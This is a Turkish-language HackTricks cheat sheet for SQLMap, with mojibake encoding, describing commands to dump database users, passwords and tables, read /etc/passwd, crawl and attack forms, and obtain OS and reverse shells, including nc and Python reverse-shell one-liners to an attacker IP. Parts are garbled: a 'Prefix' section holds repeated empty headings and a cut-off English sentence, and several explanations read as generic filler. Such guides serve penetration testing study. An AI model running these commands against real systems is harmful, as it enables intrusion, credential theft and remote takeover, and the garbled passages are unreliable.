# SQLMap - Hile KaÄŸÄ±dÄ±

<details>

<summary><strong>AWS hacklemeyi sÄ±fÄ±rdan kahraman seviyesine Ã¶ÄŸrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS KÄ±rmÄ±zÄ± TakÄ±m UzmanÄ±)</strong></a><strong>!</strong></summary>

HackTricks'Ä± desteklemenin diÄŸer yollarÄ±:

* **Åirketinizi HackTricks'te reklamÄ±nÄ±zÄ± gÃ¶rmek** veya **HackTricks'i PDF olarak indirmek** iÃ§in [**ABONELÄ°K PLANLARI'na**](https://github.com/sponsors/carlospolop) gÃ¶z atÄ±n!
* [**Resmi PEASS & HackTricks Ã¼rÃ¼nlerini**](https://peass.creator-spring.com) edinin
* [**The PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family) keÅŸfedin, Ã¶zel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
* ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katÄ±lÄ±n** veya **Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks_live)**'u takip edin**.
* **Hacking hilelerinizi** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna **PR gÃ¶ndererek paylaÅŸÄ±n**.

</details>

<figure><img src="/.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>

**Hemen kullanÄ±labilir zafiyet deÄŸerlendirme ve penetrasyon testi kurulumu**. KeÅŸiften raporlamaya kadar 20+'den fazla araÃ§ ve Ã¶zellikle her yerden tam bir pentest Ã§alÄ±ÅŸtÄ±rÄ±n. Pentester'larÄ± deÄŸiÅŸtirmiyoruz - onlara daha derine kazma, kabuk aÃ§ma ve eÄŸlenme zamanÄ± kazandÄ±rmak iÃ§in Ã¶zel araÃ§lar, tespit ve istismar modÃ¼lleri geliÅŸtiriyoruz.

{% embed url="https://pentest-tools.com/" %}

## SQLmap iÃ§in Temel ArgÃ¼manlar

### Genel
```bash
-u "<URL>"
-p "<PARAM TO TEST>"
--user-agent=SQLMAP
--random-agent
--threads=10
--risk=3 #MAX
--level=5 #MAX
--dbms="<KNOWN DB TECH>"
--os="<OS>"
--technique="UB" #Use only techniques UNION and BLIND in that order (default "BEUSTQ")
--batch #Non interactive mode, usually Sqlmap will ask you questions, this accepts the default answers
--auth-type="<AUTH>" #HTTP authentication type (Basic, Digest, NTLM or PKI)
--auth-cred="<AUTH>" #HTTP authentication credentials (name:password)
--proxy=http://127.0.0.1:8080
--union-char "GsFRts2" #Help sqlmap identify union SQLi techniques with a weird union char
```
#### Ä°Ã§erikleri Al

##### Ä°Ã§erideki Bilgiler

SQLMap, bir web uygulamasÄ±nda SQL enjeksiyonu tespit etmek ve bu enjeksiyonu kullanarak iÃ§erideki bilgileri almak iÃ§in kullanÄ±labilir. SQLMap, hedef web uygulamasÄ±nÄ±n veritabanÄ±na sÄ±zarak, veritabanÄ±ndaki tablolarÄ±, sÃ¼tunlarÄ± ve verileri alabilir.

SQLMap'i kullanarak iÃ§erideki bilgileri almak iÃ§in aÅŸaÄŸÄ±daki adÄ±mlarÄ± izleyebilirsiniz:

1. SQLMap'i hedef web uygulamasÄ±na karÅŸÄ± Ã§alÄ±ÅŸtÄ±rÄ±n:

   ```bash
   sqlmap -u <URL> --dbs
   ```

   Bu komut, hedef URL'yi belirtir ve mevcut veritabanlarÄ±nÄ± listeleyecektir.

2. VeritabanlarÄ±nÄ± listeleyen sonuÃ§larÄ± inceleyin ve hedef veritabanÄ±nÄ± belirleyin.

3. Belirli bir veritabanÄ±ndaki tablolarÄ± listeleyin:

   ```bash
   sqlmap -u <URL> -D <veritabanÄ±_adÄ±> --tables
   ```

   Bu komut, belirtilen veritabanÄ±ndaki tablolarÄ± listeleyecektir.

4. TablolarÄ± listeleyen sonuÃ§larÄ± inceleyin ve hedef tabloyu belirleyin.

5. Belirli bir tablodaki sÃ¼tunlarÄ± listeleyin:

   ```bash
   sqlmap -u <URL> -D <veritabanÄ±_adÄ±> -T <tablo_adÄ±> --columns
   ```

   Bu komut, belirtilen tablodaki sÃ¼tunlarÄ± listeleyecektir.

6. SÃ¼tunlarÄ± listeleyen sonuÃ§larÄ± inceleyin ve hedef sÃ¼tunu belirleyin.

7. Belirli bir sÃ¼tundaki verileri alÄ±n:

   ```bash
   sqlmap -u <URL> -D <veritabanÄ±_adÄ±> -T <tablo_adÄ±> -C <sÃ¼tun_adÄ±> --dump
   ```

   Bu komut, belirtilen sÃ¼tundaki verileri alacaktÄ±r.

SQLMap, bu adÄ±mlarÄ± takip ederek hedef web uygulamasÄ±nda bulunan iÃ§erideki bilgilere eriÅŸmenizi saÄŸlar.
```bash
--current-user #Get current user
--is-dba #Check if current user is Admin
--hostname #Get hostname
--users #Get usernames od DB
--passwords #Get passwords of users in DB
--privileges #Get privileges
```
#### DB verileri

The database contains sensitive information such as usernames, passwords, and other data. It is important to protect this data from unauthorized access. In the event of a data breach, it is crucial to take immediate action to mitigate the impact and prevent further damage. Regularly monitoring and securing the database is essential to ensure the confidentiality and integrity of the stored information.
```bash
--all #Retrieve everything
--dump #Dump DBMS database table entries
--dbs #Names of the available databases
--tables #Tables of a database ( -D <DB NAME> )
--columns #Columns of a table  ( -D <DB NAME> -T <TABLE NAME> )
-D <DB NAME> -T <TABLE NAME> -C <COLUMN NAME> #Dump column
```
## Enjeksiyon Yeri

### Burp/ZAP Yakalamadan

Ä°steÄŸi yakalayÄ±n ve req.txt adÄ±nda bir dosya oluÅŸturun.
```bash
sqlmap -r req.txt --current-user
```
### GET Ä°stek Enjeksiyonu

In this section, we will discuss how to perform SQL injection attacks on GET requests using sqlmap. GET requests are commonly used in web applications to retrieve data from a server. By injecting malicious SQL code into the parameters of a GET request, an attacker can manipulate the SQL query and potentially gain unauthorized access to the database.

To perform a GET request injection with sqlmap, follow these steps:

1. Identify the target URL: Determine the URL of the web application that you want to test for SQL injection vulnerabilities.

2. Identify the vulnerable parameter: Analyze the parameters in the URL to identify any potential injection points. Look for parameters that are directly used in SQL queries.

3. Use sqlmap to exploit the vulnerability: Run sqlmap with the target URL and the vulnerable parameter. Sqlmap will automatically detect and exploit the SQL injection vulnerability.

4. Analyze the results: Once sqlmap completes the injection, it will provide detailed information about the vulnerability, such as the database management system, the tables, and the data it was able to retrieve.

5. Exploit the vulnerability: Use the information obtained from sqlmap to further exploit the SQL injection vulnerability and gain unauthorized access to the database.

It is important to note that performing SQL injection attacks without proper authorization is illegal and unethical. Always ensure that you have the necessary permissions and legal rights before conducting any security testing.
```bash
sqlmap -u "http://example.com/?id=1" -p id
sqlmap -u "http://example.com/?id=*" -p id
```
### POST Ä°stek Enjeksiyonu

SQLMap can also be used to perform SQL injection on POST requests. This is useful when the target application sends sensitive data through POST parameters. To perform a POST request injection, you need to provide the target URL, the POST data, and the vulnerable parameter.

Here is the basic command structure for performing a POST request injection:

```
sqlmap -u <target_url> --data="<post_data>" -p <vulnerable_parameter>
```

Let's break down the command:

- `-u <target_url>`: Specifies the target URL where the POST request is sent.
- `--data="<post_data>"`: Specifies the POST data that will be sent with the request. Make sure to include the vulnerable parameter in the POST data.
- `-p <vulnerable_parameter>`: Specifies the vulnerable parameter in the POST request.

For example, let's say we have a target URL `http://example.com/login` and the POST data is `username=admin&password=test`. If the `username` parameter is vulnerable to SQL injection, we can use the following command:

```
sqlmap -u http://example.com/login --data="username=admin&password=test" -p username
```

SQLMap will then analyze the POST request and attempt to exploit the SQL injection vulnerability in the `username` parameter.

It's important to note that performing SQL injection on a live application without proper authorization is illegal and unethical. Always ensure that you have proper permission and authorization before conducting any security testing.
```bash
sqlmap -u "http://example.com" --data "username=*&password=*"
```
### BaÅŸlÄ±k ve DiÄŸer HTTP MetotlarÄ±nda Enjeksiyonlar

SQL enjeksiyonu, genellikle web uygulamalarÄ±nda kullanÄ±lan bir saldÄ±rÄ± tekniÄŸidir. Bu saldÄ±rÄ± tekniÄŸi, web uygulamasÄ±nÄ±n veritabanÄ±yla iletiÅŸim kurmak iÃ§in kullandÄ±ÄŸÄ± SQL sorgularÄ±na zararlÄ± kod enjekte etmeyi amaÃ§lar. SQL enjeksiyonu, baÅŸlÄ±k ve diÄŸer HTTP metotlarÄ± aracÄ±lÄ±ÄŸÄ±yla da gerÃ§ekleÅŸtirilebilir.

#### BaÅŸlÄ±k Enjeksiyonu

BaÅŸlÄ±k enjeksiyonu, HTTP baÅŸlÄ±klarÄ±na zararlÄ± kod enjekte ederek saldÄ±rganÄ±n hedef web uygulamasÄ±nda istediÄŸi iÅŸlemleri gerÃ§ekleÅŸtirmesini saÄŸlar. Bu enjeksiyon tÃ¼rÃ¼, genellikle kullanÄ±cÄ± giriÅŸiyle iliÅŸkili baÅŸlÄ±k alanlarÄ±nda gerÃ§ekleÅŸtirilir. SaldÄ±rgan, bu baÅŸlÄ±k alanlarÄ±na zararlÄ± SQL kodunu enjekte ederek veritabanÄ± Ã¼zerinde istediÄŸi iÅŸlemleri gerÃ§ekleÅŸtirebilir.

#### DiÄŸer HTTP MetotlarÄ±ndaki Enjeksiyonlar

SQL enjeksiyonu, sadece GET ve POST isteklerinde deÄŸil, diÄŸer HTTP metotlarÄ± olan PUT, DELETE, PATCH vb. isteklerde de gerÃ§ekleÅŸtirilebilir. SaldÄ±rgan, bu metotlarÄ± kullanarak hedef web uygulamasÄ±na zararlÄ± SQL kodunu enjekte edebilir ve istediÄŸi iÅŸlemleri gerÃ§ekleÅŸtirebilir.

SQL enjeksiyonu saldÄ±rÄ±larÄ±na karÅŸÄ± korunmak iÃ§in web uygulamalarÄ±nÄ±n giriÅŸ doÄŸrulama ve veri doÄŸrulama gibi gÃ¼venlik Ã¶nlemleri almasÄ± Ã¶nemlidir. AyrÄ±ca, gÃ¼venlik aÃ§Ä±klarÄ±nÄ± tespit etmek ve gidermek iÃ§in dÃ¼zenli pentestler yapÄ±lmalÄ±dÄ±r.
```bash
#Inside cookie
sqlmap  -u "http://example.com" --cookie "mycookies=*"

#Inside some header
sqlmap -u "http://example.com" --headers="x-forwarded-for:127.0.0.1*"
sqlmap -u "http://example.com" --headers="referer:*"

#PUT Method
sqlmap --method=PUT -u "http://example.com" --headers="referer:*"

#The injection is located at the '*'
```
### Enjeksiyon baÅŸarÄ±lÄ± olduÄŸunda dizeyi belirtin

Bir SQL enjeksiyonu baÅŸarÄ±lÄ± olduÄŸunda, SQL sorgusunun sonucunda dÃ¶nen dizeyi belirtmek Ã¶nemlidir. Bu, saldÄ±rganÄ±n enjeksiyonun gerÃ§ekleÅŸtiÄŸini doÄŸrulamasÄ±na ve hedef veritabanÄ±ndan bilgi Ã§almaya devam etmesine olanak tanÄ±r. SQL enjeksiyonu baÅŸarÄ±lÄ± olduÄŸunda, dÃ¶nen dize genellikle web uygulamasÄ±nÄ±n yanÄ±tÄ±nda veya hedef veritabanÄ±nÄ±n hata mesajlarÄ±nda bulunabilir. Bu dizeyi belirlemek, saldÄ±rganÄ±n hedef sistemdeki veritabanÄ± yapÄ±sÄ±nÄ± keÅŸfetmesine ve daha fazla saldÄ±rÄ± vektÃ¶rÃ¼ geliÅŸtirmesine yardÄ±mcÄ± olur.
```bash
--string="string_showed_when_TRUE"
```
### Eval

**Sqlmap**, `-e` veya `--eval` kullanarak her payload'Ä± gÃ¶ndermeden Ã¶nce bazÄ± python oneliner'larÄ±yla iÅŸlemek iÃ§in izin verir. Bu, payload'u gÃ¶ndermeden Ã¶nce Ã¶zel yollarla payload'u iÅŸlemeyi Ã§ok kolay ve hÄ±zlÄ± hale getirir. AÅŸaÄŸÄ±daki Ã¶rnekte, **flask cookie session**'Ä±n gÃ¶nderilmeden Ã¶nce flask tarafÄ±ndan bilinen bir sÄ±r ile imzalandÄ±ÄŸÄ± gÃ¶rÃ¼lmektedir:
```bash
sqlmap http://1.1.1.1/sqli --eval "from flask_unsign import session as s; session = s.sign({'uid': session}, secret='SecretExfilratedFromTheMachine')" --cookie="session=*" --dump
```
### Kabuk

Bu bÃ¶lÃ¼mde, SQL enjeksiyonu saldÄ±rÄ±larÄ± sÄ±rasÄ±nda elde edilen bir kabuÄŸun nasÄ±l kullanÄ±lacaÄŸÄ±nÄ± Ã¶ÄŸreneceksiniz. SQL enjeksiyonu saldÄ±rÄ±sÄ±, hedef web uygulamasÄ±nÄ±n veritabanÄ±na kÃ¶tÃ¼ niyetli SQL kodu enjekte ederek saldÄ±rganÄ±n yetkisiz eriÅŸim elde etmesini saÄŸlar. Bu saldÄ±rÄ± sonucunda, saldÄ±rgan bir kabuk elde edebilir ve hedef sunucuda komutlar Ã§alÄ±ÅŸtÄ±rabilir.

SQL enjeksiyonu saldÄ±rÄ±sÄ± sÄ±rasÄ±nda elde edilen bir kabuk, saldÄ±rganÄ±n hedef sunucuda komutlar Ã§alÄ±ÅŸtÄ±rmasÄ±na olanak tanÄ±r. Bu, saldÄ±rganÄ±n hedef sunucuda dosya indirmesi, yÃ¼kleme yapmasÄ±, dosya silmesi veya sistemde komut Ã§alÄ±ÅŸtÄ±rmasÄ± gibi iÅŸlemleri gerÃ§ekleÅŸtirmesini saÄŸlar.

Kabuk elde etmek iÃ§in, SQL enjeksiyonu saldÄ±rÄ±sÄ± sÄ±rasÄ±nda hedef web uygulamasÄ±nÄ±n veritabanÄ±na enjekte edilen SQL kodunda bir kabuk komutu kullanÄ±lÄ±r. Bu komut, hedef sunucuda bir kabuk aÃ§ar ve saldÄ±rganÄ±n komutlarÄ±nÄ± Ã§alÄ±ÅŸtÄ±rmasÄ±na olanak tanÄ±r.

Kabuk elde etmek iÃ§in kullanÄ±lan bazÄ± yaygÄ±n kabuk komutlarÄ± ÅŸunlardÄ±r:

- `bash -i`: Bir interaktif kabuk aÃ§ar.
- `nc -e /bin/sh <IP> <PORT>`: Belirtilen IP adresi ve port Ã¼zerinden bir kabuk aÃ§ar.
- `python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("IP",PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'`: Belirtilen IP adresi ve port Ã¼zerinden bir kabuk aÃ§ar.

Kabuk elde etmek iÃ§in kullanÄ±lan komut, hedef sunucunun iÅŸletim sistemine ve kullanÄ±lan kabuk tÃ¼rÃ¼ne baÄŸlÄ± olarak deÄŸiÅŸebilir. Bu nedenle, hedef sunucunun iÅŸletim sistemini ve kabuk tÃ¼rÃ¼nÃ¼ dikkate alarak uygun bir kabuk komutu seÃ§mek Ã¶nemlidir.

Kabuk elde etmek iÃ§in kullanÄ±lan komutu hedef web uygulamasÄ±nÄ±n SQL enjeksiyonu aÃ§Ä±ÄŸÄ±na enjekte etmek iÃ§in SQL enjeksiyonu araÃ§larÄ±ndan biri olan SQLMap kullanÄ±labilir. SQLMap, hedef web uygulamasÄ±nda SQL enjeksiyonu aÃ§Ä±ÄŸÄ± tespit etmek ve bu aÃ§Ä±ÄŸÄ± kullanarak kabuk elde etmek iÃ§in kullanÄ±lan bir araÃ§tÄ±r.

Kabuk elde etmek iÃ§in SQLMap kullanÄ±rken, aÅŸaÄŸÄ±daki komutu kullanabilirsiniz:

```
sqlmap -u "http://example.com/vulnerable_page.php?id=1" --os-shell
```

Bu komut, SQLMap'i belirtilen URL'deki SQL enjeksiyonu aÃ§Ä±ÄŸÄ±nÄ± tespit etmek ve kabuk elde etmek iÃ§in Ã§alÄ±ÅŸtÄ±rÄ±r. SQLMap, hedef sunucuda bir kabuk aÃ§ar ve saldÄ±rganÄ±n komutlarÄ±nÄ± Ã§alÄ±ÅŸtÄ±rmasÄ±na olanak tanÄ±r.

Kabuk elde etmek iÃ§in SQLMap kullanÄ±rken, hedef sunucunun iÅŸletim sistemine ve kullanÄ±lan kabuk tÃ¼rÃ¼ne baÄŸlÄ± olarak uygun bir kabuk komutu seÃ§mek Ã¶nemlidir. SQLMap, hedef sunucunun iÅŸletim sistemini ve kabuk tÃ¼rÃ¼nÃ¼ otomatik olarak tespit etmeye Ã§alÄ±ÅŸÄ±r, ancak doÄŸru sonuÃ§larÄ± garanti etmez. Bu nedenle, elde edilen kabuÄŸun Ã§alÄ±ÅŸtÄ±ÄŸÄ±ndan emin olmak iÃ§in kabuk komutunu doÄŸrulamak Ã¶nemlidir.

Kabuk elde etmek, SQL enjeksiyonu saldÄ±rÄ±larÄ± sÄ±rasÄ±nda hedef sunucuda yetkisiz eriÅŸim elde etmek iÃ§in kullanÄ±lan etkili bir yÃ¶ntemdir. Ancak, bu saldÄ±rÄ± yÃ¶ntemi yasa dÄ±ÅŸÄ±dÄ±r ve yalnÄ±zca yasal izinlerle ve etik kurallar Ã§erÃ§evesinde kullanÄ±lmalÄ±dÄ±r.
```bash
#Exec command
python sqlmap.py -u "http://example.com/?id=1" -p id --os-cmd whoami

#Simple Shell
python sqlmap.py -u "http://example.com/?id=1" -p id --os-shell

#Dropping a reverse-shell / meterpreter
python sqlmap.py -u "http://example.com/?id=1" -p id --os-pwn
```
### Dosya Okuma

Bu teknik, SQL enjeksiyonu kullanarak hedef web uygulamasÄ±nÄ±n sunucu dosyalarÄ±nÄ± okumak iÃ§in kullanÄ±lÄ±r. SQL enjeksiyonu, hedef uygulamanÄ±n veritabanÄ± sorgularÄ±na zararlÄ± SQL kodu enjekte etmek anlamÄ±na gelir. Bu sayede, sunucu tarafÄ±nda Ã§alÄ±ÅŸan SQL sorgularÄ± manipÃ¼le edilerek, hedef dosyalarÄ±n iÃ§eriÄŸi okunabilir.

SQLMap, bu tÃ¼r bir saldÄ±rÄ±yÄ± gerÃ§ekleÅŸtirmek iÃ§in kullanÄ±lan popÃ¼ler bir araÃ§tÄ±r. SQLMap, hedef uygulamanÄ±n SQL enjeksiyon aÃ§Ä±klarÄ±nÄ± otomatik olarak tespit eder ve saldÄ±rÄ±yÄ± gerÃ§ekleÅŸtirmek iÃ§in gerekli olan parametreleri belirler.

Bu teknikle, sunucu Ã¼zerindeki hassas bilgilere eriÅŸim saÄŸlanabilir. Ã–rneÄŸin, veritabanÄ± ÅŸifreleri, kullanÄ±cÄ± kimlik bilgileri veya diÄŸer Ã¶nemli veriler gibi.

Bu saldÄ±rÄ± tÃ¼rÃ¼ne karÅŸÄ± korunmak iÃ§in, web uygulamalarÄ±nÄ±n gÃ¼venli bir ÅŸekilde geliÅŸtirilmesi ve giriÅŸ doÄŸrulama, veri doÄŸrulama ve parametre sorgulama gibi gÃ¼venlik Ã¶nlemlerinin alÄ±nmasÄ± Ã¶nemlidir. AyrÄ±ca, SQL enjeksiyon aÃ§Ä±klarÄ±nÄ± tespit etmek ve dÃ¼zeltmek iÃ§in dÃ¼zenli gÃ¼venlik testleri yapÄ±lmalÄ±dÄ±r.
```bash
--file-read=/etc/passwd
```
### SQLmap ile bir web sitesini tarama ve otomatik olarak saldÄ±rÄ± gerÃ§ekleÅŸtirme

Bu yÃ¶ntemde, SQLmap aracÄ±nÄ± kullanarak bir web sitesini otomatik olarak tarayabilir ve SQL enjeksiyonu saldÄ±rÄ±larÄ±nÄ± otomatik olarak gerÃ§ekleÅŸtirebilirsiniz. SQLmap, SQL enjeksiyonu aÃ§Ä±klarÄ±nÄ± tespit etmek ve bu aÃ§Ä±klarÄ± kullanarak veritabanÄ±na eriÅŸim saÄŸlamak iÃ§in kullanÄ±lan bir araÃ§tÄ±r.

#### AdÄ±m 1: Web sitesini tarama

SQLmap'Ä± kullanarak bir web sitesini tarayabilmek iÃ§in aÅŸaÄŸÄ±daki komutu kullanabilirsiniz:

```bash
sqlmap -u <URL> --crawl=<depth>
```

- `<URL>`: Taramak istediÄŸiniz web sitesinin URL'si.
- `<depth>`: Tarama derinliÄŸi. Bu parametre, SQLmap'Ä±n kaÃ§ katman derinliÄŸe kadar tarama yapacaÄŸÄ±nÄ± belirler.

Bu komutu Ã§alÄ±ÅŸtÄ±rdÄ±ktan sonra SQLmap, web sitesini taramaya baÅŸlayacak ve SQL enjeksiyonu aÃ§Ä±klarÄ±nÄ± tespit etmek iÃ§in otomatik olarak istekler gÃ¶nderecektir.

#### AdÄ±m 2: SQL enjeksiyonu saldÄ±rÄ±larÄ±nÄ± otomatik olarak gerÃ§ekleÅŸtirme

SQLmap, tespit ettiÄŸi SQL enjeksiyonu aÃ§Ä±klarÄ±nÄ± otomatik olarak saldÄ±rÄ±ya dÃ¶nÃ¼ÅŸtÃ¼rebilir. AÅŸaÄŸÄ±daki komutu kullanarak SQLmap'Ä± bu ÅŸekilde Ã§alÄ±ÅŸtÄ±rabilirsiniz:

```bash
sqlmap -u <URL> --data=<POST data> --method=<HTTP method> --level=<level> --risk=<risk>
```

- `<URL>`: SaldÄ±rÄ± yapmak istediÄŸiniz web sitesinin URL'si.
- `<POST data>`: POST verileri. Bu parametre, SQLmap'Ä±n POST isteklerini otomatik olarak oluÅŸturmasÄ±nÄ± saÄŸlar.
- `<HTTP method>`: HTTP yÃ¶ntemi. Bu parametre, SQLmap'Ä±n hangi HTTP yÃ¶ntemini kullanacaÄŸÄ±nÄ± belirler (GET, POST, PUT, DELETE vb.).
- `<level>`: SaldÄ±rÄ± seviyesi. Bu parametre, SQLmap'Ä±n saldÄ±rÄ±larÄ± ne kadar derinlemesine gerÃ§ekleÅŸtireceÄŸini belirler.
- `<risk>`: SaldÄ±rÄ± riski. Bu parametre, SQLmap'Ä±n saldÄ±rÄ±larÄ± ne kadar riskli bir ÅŸekilde gerÃ§ekleÅŸtireceÄŸini belirler.

Bu komutu Ã§alÄ±ÅŸtÄ±rdÄ±ktan sonra SQLmap, tespit ettiÄŸi SQL enjeksiyonu aÃ§Ä±klarÄ±nÄ± kullanarak otomatik olarak saldÄ±rÄ±lar gerÃ§ekleÅŸtirecektir.

#### Notlar

- SQLmap'Ä± kullanÄ±rken dikkatli olun. Yasal izinler olmadan bir web sitesine saldÄ±rmak yasa dÄ±ÅŸÄ±dÄ±r.
- SQLmap'Ä±n otomatik saldÄ±rÄ±larÄ± gerÃ§ekleÅŸtirirken bazÄ± hatalar yapabileceÄŸini unutmayÄ±n. SaldÄ±rÄ±larÄ± gerÃ§ekleÅŸtirmeden Ã¶nce dikkatlice inceleyin ve sonuÃ§larÄ± doÄŸrulayÄ±n.
```bash
sqlmap -u "http://example.com/" --crawl=1 --random-agent --batch --forms --threads=5 --level=5 --risk=3

--batch = non interactive mode, usually Sqlmap will ask you questions, this accepts the default answers
--crawl = how deep you want to crawl a site
--forms = Parse and test forms
```
### Ä°kinci Dereceden Enjeksiyon

Second Order Injection, bir web uygulamasÄ±nda SQL enjeksiyonu saldÄ±rÄ±sÄ±nÄ±n gerÃ§ekleÅŸtirilmesi iÃ§in kullanÄ±lan bir tekniktir. Bu saldÄ±rÄ± tÃ¼rÃ¼, kullanÄ±cÄ± giriÅŸiyle ilgili verilerin veritabanÄ±na kaydedildiÄŸi ve daha sonra baÅŸka bir sorguda kullanÄ±ldÄ±ÄŸÄ± durumlarda ortaya Ã§Ä±kar.

Ä°kinci Dereceden Enjeksiyon, saldÄ±rganÄ±n kullanÄ±cÄ± giriÅŸine zararlÄ± bir SQL kodu eklemesine izin veren bir zayÄ±flÄ±k kullanÄ±r. Bu kod, veritabanÄ±nda saklanan verileri manipÃ¼le etmek veya hassas bilgilere eriÅŸmek iÃ§in kullanÄ±labilir.

Bu teknik, saldÄ±rganÄ±n hedef uygulamada gÃ¼venlik aÃ§Ä±ÄŸÄ± bulmasÄ±nÄ± ve kullanÄ±cÄ± giriÅŸinin veritabanÄ±na nasÄ±l aktarÄ±ldÄ±ÄŸÄ±nÄ± anlamasÄ±nÄ± gerektirir. ArdÄ±ndan, saldÄ±rgan, kullanÄ±cÄ± giriÅŸine zararlÄ± bir SQL kodu ekleyerek ikinci bir sorguda bu kodun Ã§alÄ±ÅŸmasÄ±nÄ± saÄŸlar.

Ä°kinci Dereceden Enjeksiyon, web uygulamalarÄ±nda yaygÄ±n olarak kullanÄ±lan bir saldÄ±rÄ± tÃ¼rÃ¼dÃ¼r ve ciddi gÃ¼venlik riskleri oluÅŸturabilir. Bu nedenle, web uygulamalarÄ±nÄ±n gÃ¼venliÄŸini saÄŸlamak iÃ§in geliÅŸtiricilerin bu tÃ¼r saldÄ±rÄ±lara karÅŸÄ± Ã¶nlemler almasÄ± Ã¶nemlidir.
```bash
python sqlmap.py -r /tmp/r.txt --dbms MySQL --second-order "http://targetapp/wishlist" -v 3
sqlmap -r 1.txt -dbms MySQL -second-order "http://<IP/domain>/joomla/administrator/index.php" -D "joomla" -dbs
```
[**Bu yazÄ±yÄ± okuyun**](second-order-injection-sqlmap.md)**, sqlmap ile basit ve karmaÅŸÄ±k ikinci derece enjeksiyonlarÄ± nasÄ±l gerÃ§ekleÅŸtireceÄŸiniz hakkÄ±nda bilgi edinin.**

## Enjeksiyonu Ã–zelleÅŸtirme

### Bir ek sonek belirleyin
```bash
python sqlmap.py -u "http://example.com/?id=1"  -p id --suffix="-- "
```
### Ã–nek

---

### Description

---

### AÃ§Ä±klama

---

### SQLMap

---

### SQLMap

---

### SQLMap is an open source penetration testing tool that automates the process of detecting and exploiting SQL injection flaws and taking over of database servers. It
```bash
python sqlmap.py -u "http://example.com/?id=1"  -p id --prefix="') "
```
### Boolean enjeksiyonunu bulmaya yardÄ±m

Boolean enjeksiyonu, bir web uygulamasÄ±nda SQL enjeksiyonu saldÄ±rÄ±sÄ± gerÃ§ekleÅŸtirmek iÃ§in kullanÄ±lan bir tekniktir. Bu saldÄ±rÄ±da, uygulamanÄ±n veritabanÄ± sorgularÄ±nda mantÄ±ksal ifadelerin sonuÃ§larÄ±nÄ± kontrol etmek iÃ§in kullanÄ±lan boolean (doÄŸru/yanlÄ±ÅŸ) deÄŸerlerini manipÃ¼le etmek amaÃ§lanÄ±r. Bu sayede saldÄ±rgan, uygulamanÄ±n veritabanÄ±ndan istediÄŸi bilgileri elde edebilir.

Boolean enjeksiyonunu tespit etmek iÃ§in aÅŸaÄŸÄ±daki adÄ±mlarÄ± izleyebilirsiniz:

1. UygulamanÄ±n giriÅŸ alanlarÄ±nÄ± kontrol edin ve kullanÄ±cÄ±dan alÄ±nan verilerin doÄŸrudan SQL sorgularÄ±na dahil edilip edilmediÄŸini belirleyin.
2. EÄŸer kullanÄ±cÄ±dan alÄ±nan veriler SQL sorgularÄ±na dahil ediliyorsa, bu verilerin mantÄ±ksal ifadelerin sonuÃ§larÄ±nÄ± kontrol etmek iÃ§in kullanÄ±ldÄ±ÄŸÄ± yerleri tespit edin.
3. MantÄ±ksal ifadelerin sonuÃ§larÄ±nÄ± kontrol eden yerlerde, kullanÄ±cÄ±dan alÄ±nan verilerin doÄŸrudan kullanÄ±ldÄ±ÄŸÄ± yerleri belirleyin.
4. KullanÄ±cÄ±dan alÄ±nan verilerin yerine boolean ifadeler (true/false) yerleÅŸtirerek, sorgunun sonucunu kontrol edin.
5. EÄŸer sorgunun sonucu deÄŸiÅŸiyorsa, bu durumda boolean enjeksiyonu olabileceÄŸini dÃ¼ÅŸÃ¼nebilirsiniz.

Boolean enjeksiyonu tespit edildikten sonra, saldÄ±rganÄ±n veritabanÄ±ndan istediÄŸi bilgileri elde etmek iÃ§in mantÄ±ksal ifadeleri manipÃ¼le etmesi gerekmektedir. Bu manipÃ¼lasyonlar genellikle mantÄ±ksal operatÃ¶rler (AND, OR, NOT) ve SQL fonksiyonlarÄ± kullanÄ±larak gerÃ§ekleÅŸtirilir.

Boolean enjeksiyonu saldÄ±rÄ±larÄ±nÄ± Ã¶nlemek iÃ§in, kullanÄ±cÄ± giriÅŸlerinin doÄŸru bir ÅŸekilde doÄŸrulandÄ±ÄŸÄ±ndan ve gÃ¼venli bir ÅŸekilde SQL sorgularÄ±na dahil edildiÄŸinden emin olunmalÄ±dÄ±r. VeritabanÄ± sorgularÄ±nda parametreli sorgular kullanmak ve giriÅŸleri filtrelemek veya kaÃ§Ä±rmak iÃ§in gÃ¼venilir bir ORM (Object-Relational Mapping) aracÄ± kullanmak iyi bir uygulama gÃ¼venliÄŸi yÃ¶ntemidir.
```bash
# The --not-string "string" will help finding a string that does not appear in True responses (for finding boolean blind injection)
sqlmap -r r.txt -p id --not-string ridiculous --batch
```
### ManipÃ¼le Etme

UnutmayÄ±n ki **kendi manipÃ¼lasyonunuzu python'da oluÅŸturabilirsiniz** ve bu Ã§ok basittir. Bir manipÃ¼lasyon Ã¶rneÄŸi [Ä°kinci Dereceden Enjeksiyon sayfasÄ±nda burada](second-order-injection-sqlmap.md) bulabilirsiniz.
```bash
--tamper=name_of_the_tamper
#In kali you can see all the tampers in /usr/share/sqlmap/tamper
```
| Tamper                       | AÃ§Ä±klama                                                                                                                           |
| ---------------------------- | ---------------------------------------------------------------------------------------------------------------------------------- |
| apostrophemask.py            | Apostrof karakterini UTF-8 tam geniÅŸlikli karÅŸÄ±lÄ±ÄŸÄ±yla deÄŸiÅŸtirir                                                                   |
| apostrophenullencode.py      | Apostrof karakterini yasaklÄ± Ã§ift unicode karÅŸÄ±lÄ±ÄŸÄ±yla deÄŸiÅŸtirir                                                                   |
| appendnullbyte.py            | Kodun sonuna kodlanmÄ±ÅŸ NULL bayt karakteri ekler                                                                                    |
| base64encode.py              | Verilen kodda bulunan tÃ¼m karakterleri Base64 ile kodlar                                                                            |
| between.py                   | BÃ¼yÃ¼k olan operatÃ¶rÃ¼ ('>') 'NOT BETWEEN 0 AND #' ile deÄŸiÅŸtirir                                                                     |
